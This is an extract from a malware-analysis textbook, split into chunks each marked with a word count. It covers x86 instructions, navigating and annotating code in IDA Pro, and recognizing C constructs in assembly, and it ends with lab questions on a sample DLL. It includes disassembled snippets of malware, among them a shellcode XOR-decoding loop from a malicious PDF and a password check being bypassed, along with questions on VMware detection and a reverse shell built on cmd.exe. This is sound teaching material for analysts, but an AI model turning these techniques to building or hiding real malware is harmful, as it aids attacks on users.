Used to initialize all bytes of a buffer to a certain value. EDI will contain the 
buffer location, and AL must contain the initialization value. This instruction is 
often seen used with xor eax, eax.
[Word Count: 37]

rep movsb
Typically used to copy a buffer of bytes. ESI must be set to the source buffer 
address, EDI must be set to the destination buffer address, and ECX must 
contain the length to copy. Byte-by-byte copy will continue until ECX = 0.
[Word Count: 44]

repne scasb
Used for searching a data buffer for a single byte. EDI must contain the 
address of the buffer, AL must contain the byte you are looking for, and ECX 
must be set to the buffer length. The comparison will continue until ECX = 0 or 
until the byte is found.
[Word Count: 52]

Listing 4-1 shows the C code for a simple program.
[Word Count: 10]

int main(int argc, char* argv[])
{
      if (argc != 3) {return 0;}
[Word Count: 12]

Listing 4-1: C code, main method example
[Word Count: 7]

004113CE                 cmp     [ebp+argc], 3 
004113D2                 jz      short loc_4113D8
004113D4                 xor     eax, eax
004113D6                 jmp     short loc_411414
004113D8                 mov     esi, esp
004113DA                 push    2               ; MaxCount
004113DC                 push    offset Str2     ; "-r"
004113E1                 mov     eax, [ebp+argv]
004113E4                 mov     ecx, [eax+4]
004113E7                 push    ecx             ; Str1
004113E8                 call    strncmp 
004113F8                 test    eax, eax
004113FA                 jnz     short loc_411412
004113FC                 mov     esi, esp 
004113FE                 mov     eax, [ebp+argv]
00411401                 mov     ecx, [eax+8]
00411404                 push    ecx             ; lpFileName
00411405                 call    DeleteFileA
[Word Count: 78]

Listing 4-2: Assembly code, C main method parameters
[Word Count: 8]

More Information: Intel x86 Architecture Manuals
[Word Count: 6]

What if you encounter an instruction you have never seen before? If you 
can’t find your answer with a Google search, you can download the complete 
x86 architecture manuals from Intel at http://www.intel.com/products/processor/
manuals/index.htm. This set includes the following:
[Word Count: 39]

Volume 1: Basic Architecture
This manual describes the architecture and programming environment. 
It is useful for helping you understand how memory works, including 
registers, memory layout, addressing, and the stack. This manual also 
contains details about general instruction groups.
[Word Count: 39]

Volume 2A: Instruction Set Reference, A–M, and Volume 2B: Instruction Set Refer-
ence, N–Z
These are the most useful manuals for the malware analyst. They alpha-
betize the entire instruction set and discuss every aspect of each instruc-
tion, including the format of the instruction, opcode information, and 
how the instruction impacts the system.
[Word Count: 54]

Volume 3A: System Programming Guide, Part 1, and Volume 3B: System Program-
ming Guide, Part 2
In addition to general-purpose registers, x86 has many special-purpose 
registers and instructions that impact execution and support the OS, 
including debugging, memory management, protection, task manage-
ment, interrupt and exception handling, multiprocessor support, and 
more. If you encounter special-purpose registers, refer to the System 
Programming Guide to see how they impact execution.
[Word Count: 68]

Optimization Reference Manual
This manual describes code-optimization techniques for applications. 
It offers additional insight into the code generated by compilers and 
has many good examples of how instructions can be used in unconven-
tional ways.
[Word Count: 35]

The Interactive Disassembler Professional (IDA Pro) is 
an extremely powerful disassembler distributed by Hex-
Rays. Although IDA Pro is not the only disassembler, 
it is the disassembler of choice for many malware ana-
lysts, reverse engineers, and vulnerability analysts.
[Word Count: 39]

By default, IDA Pro does not include the PE header or the resource sec-
tions in its disassembly (places where malware often hides malicious code). If 
you specify a manual load, IDA Pro will ask if you want to load each section, 
one by one, including the PE file header, so that these sections won’t escape 
analysis.
[Word Count: 57]

After you load a program into IDA Pro, you will see the disassembly window, 
as shown in Figure 5-2. This will be your primary space for manipulating and 
analyzing binaries, and it’s where the assembly code resides.
[Word Count: 37]

You can display the disassembly window in one of two modes: graph (the 
default, shown in Figure 5-2) and text. To switch between modes, press the 
spacebar.
[Word Count: 27]

In graph mode, IDA Pro excludes certain information that we recommend 
you display, such as line numbers and operation codes. To change these 
options, select OptionsGeneral, and then select Line prefixes and set the 
Number of Opcode Bytes to 6. Because most instructions contain 6 or fewer 
bytes, this setting will allow you to see the memory locations and opcode val-
ues for each instruction in the code listing. (If these settings make everything 
scroll off the screen to the right, try setting the Instruction Indentation to 8.)
[Word Count: 88]

Figure 5-2: Graph mode of the IDA Pro disassembly window
[Word Count: 10]

In graph mode, the color and direction of the arrows help show the pro-
gram’s flow during analysis. The arrow’s color tells you whether the path is 
based on a particular decision having been made: red if a conditional jump is 
not taken, green if the jump is taken, and blue for an unconditional jump. 
The arrow direction shows the program’s flow; upward arrows typically denote 
a loop situation. Highlighting text in graph mode highlights every instance 
of that text in the disassembly window.
[Word Count: 84]

NOTE
If you are still learning assembly code, you should find the auto comments feature of 
IDA Pro useful. To turn on this feature, select OptionsGeneral, and then check the 
Auto comments checkbox. This adds additional comments throughout the disassembly 
window to aid your analysis.
[Word Count: 45]

Figure 5-3: Text mode of IDA Pro’s disassembly window
[Word Count: 9]

Several other IDA Pro windows highlight particular items in an executable. 
The following are the most significant for our purposes.
[Word Count: 20]

Functions window
Lists all functions in the executable and shows the 
length of each. You can sort by function length and filter for large, com-
plicated functions that are likely to be interesting, while excluding tiny 
functions in the process. This window also associates flags with each func-
tion (F, L, S, and so on), the most useful of which, L, indicates library 
functions. The L flag can save you time during analysis, because you can 
identify and skip these compiler-generated functions.
[Word Count: 82]

Names window
Lists every address with a name, including functions, 
named code, named data, and strings.
[Word Count: 16]

Strings window
Shows all strings. By default, this list shows only ASCII 
strings longer than five characters. You can change this by right-clicking 
in the Strings window and selecting Setup.
[Word Count: 30]

Imports window
Lists all imports for a file.
[Word Count: 8]

Exports window
Lists all the exported functions for a file. This window 
is useful when you’re analyzing DLLs.
[Word Count: 18]

Structures window
Lists the layout of all active data structures. The win-
dow also provides you the ability to create your own data structures for 
use as memory layout templates.
[Word Count: 30]

These windows also offer a cross-reference feature that is particularly 
useful in locating interesting code. For example, to find all code locations 
that call an imported function, you could use the import window, double-
click the imported function of interest, and then use the cross-reference 
feature to locate the import call in the code listing.
[Word Count: 55]

The IDA Pro interface is so rich that, after pressing a few keys or clicking 
something, you may find it impossible to navigate. To return to the default 
view, choose WindowsReset Desktop. Choosing this option won’t undo 
any labeling or disassembly you’ve done; it will simply restore any windows 
and GUI elements to their defaults.
By the same token, if you’ve modified the window and you like what you 
see, you can save the new view by selecting WindowsSave desktop.
[Word Count: 80]

As we just noted, IDA Pro can be tricky to navigate. Many windows are linked 
to the disassembly window. For example, double-clicking an entry within the 
Imports window or Strings window will take you directly to that entry.
[Word Count: 38]

Another way to navigate IDA Pro is to use the links within the disassembly 
window, such as the links shown in Listing 5-1. Double-clicking any of these 
links  will display the target location in the disassembly window.
[Word Count: 38]

00401075        jnz     short loc_40107E
00401077        mov     [ebp+var_10], 1
0040107E loc_40107E:                  ; CODE XREF: sub_401040+35j
0040107E        cmp     [ebp+var_C], 0
00401082        jnz     short loc_401097
00401084        mov     eax, [ebp+var_4]
00401087        mov     [esp+18h+var_14], eax
0040108B        mov     [esp+18h+var_18], offset aPrintNumberD ; "Print Number= %d\n"
00401092        call  printf
00401097        call  sub_4010A0
[Word Count: 45]

Listing 5-1: Navigational links within the disassembly window
[Word Count: 8]

The following are the most common types of links:
[Word Count: 9]


Sub links are links to the start of functions such as printf and sub_4010A0.
[Word Count: 15]


Loc links are links to jump destinations such as loc_40107E and loc_401097.
[Word Count: 13]


Offset links are links to an offset in memory.
[Word Count: 10]

Cross-references (shown at  in the listing) are useful for jumping 
the display to the referencing location: 0x401075 in this example. Because 
strings are typically references, they are also navigational links. For example, 
aPrintNumberD can be used to jump the display to where that string is defined 
in memory.
[Word Count: 49]

The horizontal color band at the base of the toolbar is the navigation band, 
which presents a color-coded linear view of the loaded binary’s address 
space. The colors offer insight into the file contents at that location in the 
file as follows:
[Word Count: 42]


Light blue is library code as recognized by FLIRT.
[Word Count: 10]

You should perform malware analysis in the dark-blue region. If you start 
getting lost in messy code, the navigational band can help you get back on 
track. IDA Pro’s default colors for data are pink for imports, gray for defined 
data, and brown for undefined data.
[Word Count: 46]

NOTE
If you have an older version of IDA Pro, your FLIRT signatures may not be up to date 
and you can end up with a lot of library code in the dark-blue region. FLIRT isn’t per-
fect, and sometimes it won’t recognize and label all library code properly.
[Word Count: 49]

To jump to any virtual memory address, simply press the G key on your key-
board while in the disassembly window. A dialog box appears, asking for a 
virtual memory address or named location, such as sub_401730 or printf.
[Word Count: 39]

IDA Pro’s forward and back buttons, shown in 
Figure 5-4, make it easy to move through your 
history, just as you would move through a his-
tory of web pages in a browser. Each time you 
navigate to a new location within the dis-
assembly window, that location is added to 
your history.
[Word Count: 53]

To jump to a raw file offset, choose JumpJump to File Offset. For 
example, if you’re viewing a PE file in a hex editor and you see something 
interesting, such as a string or shellcode, you can use this feature to get to 
that raw offset, because when the file is loaded into IDA Pro, it will be mapped 
as though it had been loaded by the OS loader.
[Word Count: 69]

Selecting Search from the top menu will display many options for moving 
the cursor in the disassembly window:
[Word Count: 18]


Choose SearchNext Code to move the cursor to the next location con-
taining an instruction you specify.
[Word Count: 18]


Choose SearchText to search the entire disassembly window for a spe-
cific string.
[Word Count: 14]


Choose SearchSequence of Bytes to perform a binary search in the 
hex view window for a certain byte order. This option can be useful when 
you’re searching for specific data or opcode combinations.
[Word Count: 34]

The following example displays the command-line analysis of the 
password.exe binary. This malware requires a password to continue running, 
and you can see that it prints the string Bad key after we enter an invalid 
password (test).
[Word Count: 37]

C:\>password.exe
Enter password for this Malware: test
Bad key
[Word Count: 9]

We then pull this binary into IDA Pro and see how we can use the search 
feature and links to unlock the program. We begin by searching for all occur-
rences of the Bad key string, as shown in Figure 5-5. We notice that Bad key is 
used at 0x401104 , so we jump to that location in the disassembly window 
by double-clicking the entry in the search window.
[Word Count: 69]

The disassembly listing around the location of 0x401104 is shown 
next. Looking through the listing, before "Bad key\n", we see a comparison 
at 0x4010F1, which tests the result of a strcmp. One of the parameters to the 
strcmp is the string, and likely password, $mab.
[Word Count: 45]

004010E0        push    offset aMab     ; "$mab"
004010E5        lea     ecx, [ebp+var_1C]
004010E8        push    ecx
004010E9        call    strcmp
004010EE        add     esp, 8
004010F1        test    eax, eax
004010F3        jnz     short loc_401104
004010F5        push    offset aKeyAccepted ; "Key Accepted!\n"
004010FA        call    printf
004010FF        add     esp, 4
00401102        jmp     short loc_401118
00401104 loc_401104                    ; CODE XREF: _main+53j
00401104        push    offset aBadKey  ; "Bad key\n"
00401109        call    printf
[Word Count: 62]

The next example shows the result of entering the password we discov-
ered, $mab, and the program prints a different result.
[Word Count: 21]

C:\>password.exe
Enter password for this Malware: $mab
Key Accepted!
The malware has been unlocked
[Word Count: 14]

This example demonstrates how quickly you can use the search feature 
and links to get information about a binary.
[Word Count: 19]

A cross-reference, known as an xref in IDA Pro, can tell you where a function 
is called or where a string is used. If you identify a useful function and want 
to know the parameters with which it is called, you can use a cross-reference to 
navigate quickly to the location where the parameters are placed on the stack. 
Interesting graphs can also be generated based on cross-references, which 
are helpful to performing analysis.
[Word Count: 74]

Listing 5-2 shows a code cross-reference at  that tells us that this function 
(sub_401000) is called from inside the main function at offset 0x3 into the 
main function. The code cross-reference for the jump at  tells us which 
jump takes us to this location, which in this example corresponds to the 
location marked at . We know this because at offset 0x19 into sub_401000 is 
the jmp at memory address 0x401019.
[Word Count: 73]

00401000        sub_401000      proc near      ; CODE XREF: _main+3p
00401000        push    ebp
00401001        mov     ebp, esp
00401003   loc_401003: 
; CODE XREF: sub_401000+19j
00401003        mov     eax, 1
[Word Count: 25]

00401008        test    eax, eax
0040100A        jz      short loc_40101B
0040100C        push    offset aLoop    ; "Loop\n"
00401011        call    printf
00401016        add     esp, 4
00401019        jmp     short loc_401003 
[Word Count: 26]

By default, IDA Pro shows only a couple of cross-references for any given 
function, even though many may occur when a function is called. To view all 
the cross-references for a function, click the function name and press X on 
your keyboard. The window that pops up should list all locations where this 
function is called. At the bottom of the Xrefs window in Figure 5-6, which 
shows a list of cross-references for sub_408980, you can see that this function 
is called 64 times (“Line 1 of 64”).
[Word Count: 88]

Double-click any entry in the Xrefs window to go to the corresponding 
reference in the disassembly window.
[Word Count: 17]

Data cross-references are used to track the way data is accessed within a 
binary. Data references can be associated with any byte of data that is refer-
enced in code via a memory reference, as shown in Listing 5-3. For example, 
you can see the data cross-reference to the DWORD 0x7F000001 at . The cor-
responding cross-reference tells us that this data is used in the function 
located at 0x401020. The following line shows a data cross-reference for the 
string <Hostname> <Port>.
[Word Count: 82]

0040C000 dword_40C000    dd 7F000001h        ; DATA XREF: sub_401020+14r
0040C004 aHostnamePort   db '<Hostname> <Port>',0Ah,0  ; DATA XREF: sub_401000+3o
[Word Count: 17]

Recall from Chapter 1 that the static analysis of strings can often be used 
as a starting point for your analysis. If you see an interesting string, use IDA 
Pro’s cross-reference feature to see exactly where and how that string is used 
within the code.
[Word Count: 45]

One of the most powerful aspects of IDA Pro is its ability to recognize 
functions, label them, and break down the local variables and parameters. 
Listing 5-4 shows an example of a function that has been recognized by 
IDA Pro.
[Word Count: 40]

Notice how IDA Pro tells us that this is an EBP-based stack frame used in 
the function , which means the local variables and parameters will be refer-
enced via the EBP register throughout the function. IDA Pro has successfully 
discovered all local variables and parameters in this function. It has labeled
[Word Count: 52]

When you click one of these buttons on the toolbar, you will be presented 
with a graph via an application called WinGraph32. Unlike the graph view 
of the disassembly window, these graphs cannot be manipulated with IDA. 
(They are often referred to as legacy graphs.) The options on the graphing 
button toolbar are described in Table 5-1.
[Word Count: 57]

IDA Pro supports five graphing options, accessi-
ble from the buttons on the toolbar shown in 
Figure 5-7. Four of these graphing options utilize 
cross-references.
Figure 5-7: Graphing 
button toolbar
[Word Count: 30]

Creates a flow chart 
of the current function
Users will prefer to use the interactive graph mode of the 
disassembly window but may use this button at times to see 
an alternate graph view. (We’ll use this option to graph code 
in Chapter 6.)
[Word Count: 44]

Graphs function calls 
for the entire program
Use this to gain a quick understanding of the hierarchy of 
function calls made within a program, as shown in Figure 5-8. 
To dig deeper, use WinGraph32’s zoom feature. You will 
find that graphs of large statically linked executables can 
become so cluttered that the graph is unusable.
[Word Count: 55]

Graphs the cross-
references to get to a 
currently selected 
cross-reference
[Word Count: 11]

This is useful for seeing how to reach a certain identifier. It’s 
also useful for functions, because it can help you see the 
different paths that a program can take to reach a particular 
function.
[Word Count: 35]

Figure 5-8: Cross-reference graph of a program
[Word Count: 7]

Figure 5-9: Cross-reference graph of a single function (sub_4011F0)
[Word Count: 9]

Graphs the cross-
references from the 
currently selected 
symbol
[Word Count: 9]

This is a useful way to see a series of function calls. For 
example, Figure 5-9 displays this type of graph for a single 
function. Notice how sub_4011f0 calls sub_401110, which then 
calls gethostbyname. This view can quickly tell you what a 
function does and what the functions do underneath it. This is 
the easiest way to get a quick overview of the function.
[Word Count: 64]

Graphs a user-
specified cross-
reference graph
[Word Count: 7]

Use this option to build a custom graph. You can specify the 
graph’s recursive depth, the symbols used, the to or from 
symbol, and the types of nodes to exclude from the graph. 
This is the only way to modify graphs generated by IDA Pro 
for display in WinGraph32.
[Word Count: 49]

One of IDA Pro’s best features is that it allows you to modify its disassembly 
to suit your goals. The changes that you make can greatly increase the speed 
with which you can analyze a binary.
[Word Count: 36]

WARNING 
IDA Pro has no undo feature, so be careful when you make changes.
[Word Count: 14]

IDA Pro lets you embed comments throughout your disassembly and adds 
many comments automatically.
To add your own comments, place the cursor on a line of disassembly 
and press the colon (:) key on your keyboard to bring up a comment win-
dow. To insert a repeatable comment to be echoed across the disassembly 
window whenever there is a cross-reference to the address in which you 
added the comment, press the semicolon (;) key.
[Word Count: 74]

When disassembling, IDA Pro makes decisions regarding how to format 
operands for each instruction that it disassembles. Unless there is context, 
the data displayed is typically formatted as hex values. IDA Pro allows you to 
change this data if needed to make it more understandable.
[Word Count: 45]

Figure 5-10 shows an example of modifying operands in an instruction, 
where 62h is compared to the local variable var_4. If you were to right-click 
62h, you would be presented with options to change the 62h into 98 in deci-
mal, 142o in octal, 1100010b in binary, or the character b in ASCII—whatever 
suits your needs and your situation.
[Word Count: 59]

Figure 5-10: Function operand manipulation
[Word Count: 5]

To change whether an operand references memory or stays as data, press 
the O key on your keyboard. For example, suppose when you’re analyzing 
disassembly with a link to loc_410000, you trace the link back and see the fol-
lowing instructions:
[Word Count: 41]

mov eax, loc_410000
add ebx, eax
mul ebx
[Word Count: 8]

At the assembly level, everything is a number, but IDA Pro has mislabeled 
the number 4259840 (0x410000 in hex) as a reference to the address 410000. 
To correct this mistake, press the O key to change this address to the number 
410000h and remove the offending cross-reference from the disassembly 
window.
[Word Count: 51]

Table 5-2: Function Operand Manipulation
[Word Count: 5]

Without renamed arguments
With renamed arguments
[Word Count: 6]

004013C8  mov   eax, [ebp+arg_4]
004013CB  push  eax             
004013CC  call  _atoi
004013D1  add   esp, 4
004013D4  mov [ebp+var_598], ax
004013DB  movzx ecx, [ebp+var_598]
004013E2  test  ecx, ecx
004013E4  jnz   short loc_4013F8
004013E6  push  offset aError
004013EB  call  printf
004013F0  add   esp, 4
004013F3  jmp   loc_4016FB
004013F8 ; ----------------------
004013F8
004013F8 loc_4013F8:   
004013F8  movzx edx, [ebp+var_598]
004013FF  push  edx            
00401400  call  ds:htons
[Word Count: 60]

004013C8  mov   eax, [ebp+port_str]
004013CB  push  eax 
004013CC  call  _atoi
004013D1  add   esp, 4
004013D4  mov   [ebp+port], ax
004013DB  movzx ecx, [ebp+port]
004013E2  test  ecx, ecx
004013E4  jnz   short loc_4013F8
004013E6  push  offset aError 
004013EB  call  printf
004013F0  add   esp, 4
004013F3  jmp   loc_4016FB
004013F8 ; --------------------
004013F8
004013F8 loc_4013F8:
004013F8  movzx edx, [ebp+port]
004013FF  push  edx 
00401400  call  ds:htons
[Word Count: 60]

Figure 5-11: Standard symbolic constant window
[Word Count: 6]

The code snippets in Table 5-3 show the effect of applying the standard 
symbolic constants for a Windows API call to CreateFileA. Note how much 
more meaningful the code is on the right.
[Word Count: 33]

NOTE
To determine which value to choose from the often extensive list provided in the stan-
dard symbolic constant window, you will need to go to the MSDN page for the Windows 
API call. There you will see the symbolic constants that are associated with each param-
eter. We will discuss this further in Chapter 7, when we discuss Windows concepts.
[Word Count: 61]

Table 5-3: Code Before and After Standard Symbolic Constants
[Word Count: 9]

Before symbolic constants
After symbolic constants
[Word Count: 6]

mov     esi, [esp+1Ch+argv]
mov     edx, [esi+4]
mov     edi, ds:CreateFileA
push    0    ; hTemplateFile
push    80h  ; dwFlagsAndAttributes
push    3    ; dwCreationDisposition
push    0    ; lpSecurityAttributes
push    1    ; dwShareMode
push    80000000h ; dwDesiredAccess
push    edx ;  lpFileName
call    edi ; CreateFileA
[Word Count: 41]

mov     esi, [esp+1Ch+argv]
mov     edx, [esi+4]
mov     edi, ds:CreateFileA
push    NULL  ; hTemplateFile
push    FILE_ATTRIBUTE_NORMAL ; dwFlagsAndAttributes
push    OPEN_EXISTING   
; dwCreationDisposition
push    NULL              
; lpSecurityAttributes
push    FILE_SHARE_READ 
; dwShareMode
push    GENERIC_READ     
; dwDesiredAccess
push    edx ; lpFileName
call    edi ; CreateFileA
[Word Count: 41]

Figure 5-12: Options for 
loading IDC and Python 
Scripts
[Word Count: 9]

Table 5-4: Manually Disassembling Shellcode in the paycuts.pdf Document
[Word Count: 9]

File before pressing C
File after pressing C
[Word Count: 8]

00008384  db  28h ; (
00008385  db 0FCh ; n
00008386  db  10h
00008387  nop
00008388  nop
00008389  mov     ebx, eax
0000838B  add     ebx, 28h ; '('
0000838E  add     dword ptr [ebx], 1Bh
00008391  mov     ebx, [ebx]
00008393  xor     ecx, ecx
00008395
00008395 loc_8395:                         ; CODE XREF: seg000:000083A0j
00008395  xor     byte ptr [ebx], 97h 
00008398  inc     ebx
00008399  inc     ecx
0000839A  cmp     ecx, 700h
000083A0  jnz     short loc_8395
000083A2  retn    7B1Ch
000083A2 ; ----------------------------------000083A5  db  16h
000083A6  db  7Bh ; {
000083A7  db  8Fh ; Å
[Word Count: 87]

#include <idc.idc>
static main(void){
      auto slotidx;
      slotidx = 1;
      MarkPosition(0x00403108, 0, 0, 0, slotidx + 0, "RIJNDAEL [S] [char]");
      MakeComm(PrevNotTail(0x00403109), "RIJNDAEL [S] [char]\nRIJNDAEL (AES): 
SBOX (also used in other ciphers).");
[Word Count: 30]

MarkPosition(0x00403208, 0, 0, 0, slotidx + 1, "RIJNDAEL [S-inv] [char]");
      MakeComm(PrevNotTail(0x00403209), "RIJNDAEL [S-inv] [char]\nRIJNDAEL (AES): 
inverse SBOX (for decryption)");
}
[Word Count: 20]

Listing 5-5: IDC script generated by the PEiD KANAL plug-in
[Word Count: 10]

To load an IDC script, select FileScript File. The IDC script should be 
executed immediately, and a toolbar window should open with one button 
for editing and another for re-executing the script if needed.
[Word Count: 34]

from idautils import *
from idc import *
[Word Count: 8]

heads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))
[Word Count: 4]

for i in heads:
  if GetMnem(i) == "call":
    functionCalls.append(i)
[Word Count: 9]

print "Number of calls found: %d" % (len(functionCalls))
[Word Count: 8]

for i in functionCalls:
  SetColor(i, CIC_ITEM, 0xc7fdff)
[Word Count: 7]

Listing 5-6: Useful Python script to color all function calls
[Word Count: 10]

Analyze the malware found in the file Lab05-01.dll using only IDA Pro. The 
goal of this lab is to give you hands-on experience with IDA Pro. If you’ve 
already worked with IDA Pro, you may choose to ignore these questions and 
focus on reverse-engineering the malware.
[Word Count: 46]

2.
Use the Imports window to browse to gethostbyname. Where is the import 
located?
[Word Count: 14]

3.
How many functions call gethostbyname?
[Word Count: 6]

4.
Focusing on the call to gethostbyname located at 0x10001757, can you fig-
ure out which DNS request will be made?
[Word Count: 21]

5.
How many local variables has IDA Pro recognized for the subroutine at 
0x10001656?
[Word Count: 14]

6.
How many parameters has IDA Pro recognized for the subroutine at 
0x10001656?
[Word Count: 13]

7.
Use the Strings window to locate the string \cmd.exe /c in the disassembly. 
Where is it located?
[Word Count: 18]

8.
What is happening in the area of code that references \cmd.exe /c?
[Word Count: 13]

9.
In the same area, at 0x100101C8, it looks like dword_1008E5C4 is a global 
variable that helps decide which path to take. How does the malware set 
dword_1008E5C4? (Hint: Use dword_1008E5C4’s cross-references.)
[Word Count: 32]

10. A few hundred lines into the subroutine at 0x1000FF58, a series of com-
parisons use memcmp to compare strings. What happens if the string compar-
ison to robotwork is successful (when memcmp returns 0)?
[Word Count: 35]

12. Use the graph mode to graph the cross-references from sub_10004E79. 
Which API functions could be called by entering this function? Based on 
the API functions alone, what could you rename this function?
[Word Count: 33]

13. How many Windows API functions does DllMain call directly? How many 
at a depth of 2?
[Word Count: 17]

14. At 0x10001358, there is a call to Sleep (an API function that takes one 
parameter containing the number of milliseconds to sleep). Looking 
backward through the code, how long will the program sleep if this code 
executes?
[Word Count: 38]

15. At 0x10001701 is a call to socket. What are the three parameters?
[Word Count: 13]

16. Using the MSDN page for socket and the named symbolic constants func-
tionality in IDA Pro, can you make the parameters more meaningful? 
What are the parameters after you apply changes?
[Word Count: 32]

17. Search for usage of the in instruction (opcode 0xED). This instruction is 
used with a magic string VMXh to perform VMware detection. Is that in use 
in this malware? Using the cross-references to the function that executes 
the in instruction, is there further evidence of VMware detection?
[Word Count: 48]

18. Jump your cursor to 0x1001D988. What do you find?
[Word Count: 10]

19. If you have the IDA Python plug-in installed (included with the com-
mercial version of IDA Pro), run Lab05-01.py, an IDA Pro Python script 
provided with the malware for this book. (Make sure the cursor is at 
0x1001D988.) What happens after you run the script?
[Word Count: 46]

20. With the cursor in the same location, how do you turn this data into a 
single ASCII string?
[Word Count: 19]

21. Open the script with a text editor. How does it work?
[Word Count: 12]

R E C O G N I Z I N G  C  C O D E  
C O N S T R U C T S  I N  A S S E M B L Y
[Word Count: 36]

Global variables can be accessed and used by any function in a program. 
Local variables can be accessed only by the function in which they are 
defined. Both global and local variables are declared similarly in C, but 
they look completely different in assembly.
Following are two examples of C code for both global and local variables. 
Notice the subtle difference between the two. The global example, Listing 6-1, 
defines x and y variables outside the function. In the local example, Listing 6-2, 
the variables are defined within the function.
[Word Count: 90]

void main()
{
   x = x+y;
   printf("total = %d\n", x);
}
[Word Count: 11]

Listing 6-1: A simple program with two global variables
[Word Count: 9]

Recognizing C Code Constructs in Assembly
111
[Word Count: 7]

x = x+y;
   printf("total = %d\n", x);
}
[Word Count: 8]

Listing 6-2: A simple program with two local variables
[Word Count: 9]

The difference between the global and local variables in these C code 
examples is small, and in this case the program result is the same. But the dis-
assembly, shown in Listings 6-3 and 6-4, is quite different. The global variables 
are referenced by memory addresses, and the local variables are referenced 
by the stack addresses.
In Listing 6-3, the global variable x is signified by dword_40CF60, a memory 
location at 0x40CF60. Notice that x is changed in memory when eax is moved 
into dword_40CF60 at . All subsequent functions that utilize this variable will 
be impacted.
[Word Count: 97]

00401003        mov     eax, dword_40CF60
00401008        add     eax, dword_40C000
0040100E        mov     dword_40CF60, eax 
00401013        mov     ecx, dword_40CF60
00401019        push    ecx
0040101A        push    offset aTotalD  ;"total = %d\n"
0040101F        call    printf
[Word Count: 30]

Listing 6-3: Assembly code for the global variable example in Listing 6-1
[Word Count: 12]

In Listings 6-4 and 6-5, the local variable x is located on the stack at a 
constant offset relative to ebp. In Listing 6-4, memory location [ebp-4] is 
used consistently throughout this function to reference the local variable x. 
This tells us that ebp-4 is a stack-based local variable that is referenced only 
in the function in which it is defined.
[Word Count: 61]

00401006        mov     dword ptr [ebp-4], 1
0040100D        mov     dword ptr [ebp-8], 2
00401014        mov     eax, [ebp-4]
00401017        add     eax, [ebp-8]
0040101A        mov     [ebp-4], eax
0040101D        mov     ecx, [ebp-4]
00401020        push    ecx
00401021        push    offset aTotalD  ; "total = %d\n"
00401026        call    printf
[Word Count: 42]

Listing 6-4: Assembly code for the local variable example in Listing 6-2, without labeling
[Word Count: 14]

In Listing 6-5, x has been nicely labeled by IDA Pro Disassembler with 
the dummy name var_4. As we discussed in Chapter 5, dummy names can be 
renamed to meaningful names that reflect their function. Having this local 
variable named var_4 instead of -4 simplifies your analysis, because once you 
rename var_4 to x, you won’t need to track the offset -4 in your head through-
out the function.
[Word Count: 69]

00401006        mov     [ebp+var_4], 1
0040100D        mov     [ebp+var_8], 2
00401014        mov     eax, [ebp+var_4]
00401017        add     eax, [ebp+var_8]
0040101A        mov     [ebp+var_4], eax
0040101D        mov     ecx, [ebp+var_4]
00401020        push    ecx
00401021        push    offset aTotalD  ; "total = %d\n"
00401026        call    printf
[Word Count: 38]

Listing 6-5: Assembly code for the local variable example shown in Listing 6-2, with labeling
[Word Count: 15]

Many different types of math operations can be performed in C program-
ming, and we’ll present the disassembly of those operations in this section.
Listing 6-6 shows the C code for two variables and a variety of arithmetic 
operations. Two of these are the -- and ++ operations, which are used to dec-
rement by 1 and increment by 1, respectively. The % operation performs the 
modulo between the two variables, which is the remainder after performing a 
division operation.
[Word Count: 80]

int a = 0; 
int b = 1;
a = a + 11;
a = a - b;
a--; 
b++; 
b = a % 3;
[Word Count: 25]

Listing 6-6: C code with two variables and a variety of arithmetic
[Word Count: 12]

Listing 6-7 shows the assembly for the C code shown in Listing 6-6, which 
can be broken down to translate back to C.
[Word Count: 23]

00401006        mov     [ebp+var_4], 0
0040100D        mov     [ebp+var_8], 1
00401014        mov     eax, [ebp+var_4] 
00401017        add     eax, 0Bh
0040101A        mov     [ebp+var_4], eax 
0040101D        mov     ecx, [ebp+var_4]
00401020        sub     ecx, [ebp+var_8] 
00401023        mov     [ebp+var_4], ecx 
00401026        mov     edx, [ebp+var_4]
00401029        sub     edx, 1 
0040102C        mov     [ebp+var_4], edx 
0040102F        mov     eax, [ebp+var_8]
00401032        add     eax, 1 
00401035        mov     [ebp+var_8], eax 
00401038        mov     eax, [ebp+var_4]
0040103B        cdq 
0040103C        mov     ecx, 3
[Word Count: 70]

Recognizing C Code Constructs in Assembly
113
[Word Count: 7]

00401041        idiv    ecx 
00401043        mov     [ebp+var_8], edx 
[Word Count: 8]

Listing 6-7: Assembly code for the arithmetic example in Listing 6-6
[Word Count: 11]

Programmers use if statements to alter program execution based on certain 
conditions. if statements are common in C code and disassembly. We’ll exam-
ine basic and nested if statements in this section. Your goal should be to learn 
how to recognize different types of if statements.
Listing 6-8 displays a simple if statement in C with the assembly for this 
code shown in Listing 6-9. Notice the conditional jump jnz at . There must 
be a conditional jump for an if statement, but not all conditional jumps cor-
respond to if statements.
[Word Count: 92]

if(x == y){
      printf("x equals y.\n");
}else{
      printf("x is not equal to y.\n");
}
[Word Count: 14]

Listing 6-8: C code if statement example
[Word Count: 7]

00401006        mov
[ebp+var_8], 1
0040100D        mov
[ebp+var_4], 2
00401014        mov
eax, [ebp+var_8]
00401017        cmp
eax, [ebp+var_4] 
0040101A        jnz
short loc_40102B 
0040101C        push
offset aXEqualsY_ ; "x equals y.\n"
00401021        call
printf
00401026        add
esp, 4
00401029        jmp
short loc_401038 
0040102B loc_40102B:
0040102B        push
offset aXIsNotEqualToY ; "x is not equal to y.\n"
00401030        call
printf
[Word Count: 58]

Listing 6-9: Assembly code for the if statement example in Listing 6-8
[Word Count: 12]

Analyzing Functions Graphically with IDA Pro
[Word Count: 6]

Listing 6-10 shows C code for a nested if statement that is similar to Listing 6-8, 
except that two additional if statements have been added within the original 
if statement. These additional statements test to determine whether z is equal 
to 0.
[Word Count: 42]

if(x == y){
     if(z==0){
          printf("z is zero and x = y.\n");
     }else{
          printf("z is non-zero and x = y.\n");
     }
}else{
     if(z==0){
          printf("z zero and x != y.\n");
     }else{
          printf("z non-zero and x != y.\n");
     }
}
[Word Count: 37]

Listing 6-10: C code for a nested if statement
[Word Count: 9]

Recognizing C Code Constructs in Assembly
115
[Word Count: 7]

Figure 6-1: Disassembly graph for the if statement example in Listing 6-9
[Word Count: 12]

Despite this minor change to the C code, the assembly code is more com-
plicated, as shown in Listing 6-11.
[Word Count: 20]

00401006        mov     [ebp+var_8], 0
0040100D        mov     [ebp+var_4], 1
00401014        mov     [ebp+var_C], 2
0040101B        mov     eax, [ebp+var_8]
0040101E        cmp     eax, [ebp+var_4]
00401021        jnz     short loc_401047 
